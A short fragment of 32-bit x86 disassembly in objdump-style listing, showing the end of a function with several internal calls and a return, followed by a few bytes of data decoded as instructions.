  4ce1aa:	add    eax,DWORD PTR [ebp-0x2c]
  4ce1ad:	push   edx
  4ce1ae:	call   0x4cd328
  4ce1b3:	pop    edx
  4ce1b4:	push   edx
  4ce1b5:	push   ecx
  4ce1b6:	push   DWORD PTR [edx+0xf8]
  4ce1bc:	push   DWORD PTR [edx+0x1cc]
  4ce1c2:	push   DWORD PTR [edx+0x12c]
  4ce1c8:	call   0x4cdcd8
  4ce1cd:	add    esp,0x10
  4ce1d0:	pop    edx
  4ce1d1:	push   edx
  4ce1d2:	push   0x0
  4ce1d4:	call   0x4cd6b8
  4ce1d9:	pop    edx
  4ce1da:	add    esp,0x54
  4ce1dd:	pop    ebp
  4ce1de:	ret    
  4ce1df:	add    BYTE PTR [edi+0x33],bl
  4ce1e2:	sar    bh,0x14
  4ce1e5:	inc    ebp
  4ce1e6:	adc    al,0xf7
  4ce1e8:	dec    esp
  4ce1e9:	add    BYTE PTR [edi+0x3e],dl
  4ce1ec:	ret    0x0
  4ce1ef:	push   es
